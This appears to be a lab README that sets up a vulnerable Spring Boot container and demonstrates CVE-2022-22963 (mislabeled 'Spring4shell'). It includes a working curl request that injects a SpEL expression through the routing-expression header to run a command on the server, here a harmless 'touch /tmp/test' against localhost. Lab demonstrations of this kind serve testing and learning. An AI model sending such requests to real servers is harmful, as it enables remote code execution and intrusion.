# CVE-2022-22963 - Spring4shell
To run the vulnerable SpringBoot application run this docker container exposing it to port 8080.  
Example:

```bash
docker build -t sentiment_analyzer .
docker run -d --name spring-container -p 8080:8080 sentiment_analyzer
```

## Exploit
Curl command (creates a `test` folder in `/tmp/test`):  
**Note**: this might give you a `500` status code (this is normal).
```bash
curl -i -s -k -X POST \
	-H "Host: localhost:8080" \
	-H "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec('touch /tmp/test')" \
	--data-binary "exploit_poc" http://localhost:8080/functionRouter
```

Check RCE:
```bash
docker exec spring-container ls /tmp
```

## Credits
https://github.com/hktalent/spring-spel-0day-poc
https://github.com/darryk10/CVE-2022-22963?tab=readme-ov-file
https://sysdig.com/blog/cve-2022-22963-spring-cloud

## Troubleshoot 
https://stackoverflow.com/questions/48118698/cant-get-spring-boot-thin-launcher-examples-to-work
